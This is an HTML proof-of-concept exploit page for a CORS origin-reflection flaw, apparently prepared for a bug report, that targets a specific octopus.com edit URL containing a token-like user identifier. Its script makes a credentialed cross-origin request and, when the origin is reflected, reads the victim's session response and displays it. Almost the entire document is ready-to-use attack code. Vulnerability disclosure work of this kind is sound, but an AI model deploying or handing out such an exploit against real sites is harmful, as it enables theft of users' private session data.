<!DOCTYPE html>
<html>
  <head>
    <title>CORS Vulnerability PoC</title>
  </head>
  <body>
    <h1>CORS Vulnerability Proof of Concept</h1>
    <p>This page demonstrates a CORS misconfiguration on the target domain. The server incorrectly reflects the 'Origin' header, allowing an attacker to read sensitive data from a victim's browser session.</p>

    <div id="result"></div>

    <script>
      const VULNERABLE_URL = 'https://experiences.octopus.com/edit/user/S5MXxSUXSwK14Z8keWBBd6Fq3w6UFIsisQh74967mTyL9P-1RWXG9-F6slQQ10ZwKLtXEa/elements.js';

      fetch(VULNERABLE_URL, {
        method: 'GET',
        // 'credentials: "include"' is crucial for sending cookies
        credentials: 'include'
      })
      .then(response => {
        const allowOriginHeader = response.headers.get('Access-Control-Allow-Origin');
        // The server reflects the browser's Origin header.
        if (allowOriginHeader === window.location.origin) {
          console.log('Vulnerability Confirmed. The server reflected the origin:', allowOriginHeader);
          return response.text();
        } else {
          console.log('CORS vulnerability not found. The server did not reflect the origin.');
          throw new Error('CORS vulnerability not found');
        }
      })
      .then(data => {
        document.getElementById('result').innerHTML = '<h2>Vulnerability Confirmed!</h2>' +
                                                     '<p>Sensitive data was successfully read from the victim\'s session.</p>' +
                                                     '<textarea rows="15" cols="80">' + data + '</textarea>';
        console.log('Successfully read sensitive data:', data);
      })
      .catch(error => {
        console.error('Error:', error);
        document.getElementById('result').innerHTML = '<p style="color:red;">Error: ' + error.message + '</p>';
      });
    </script>
  </body>
</html>
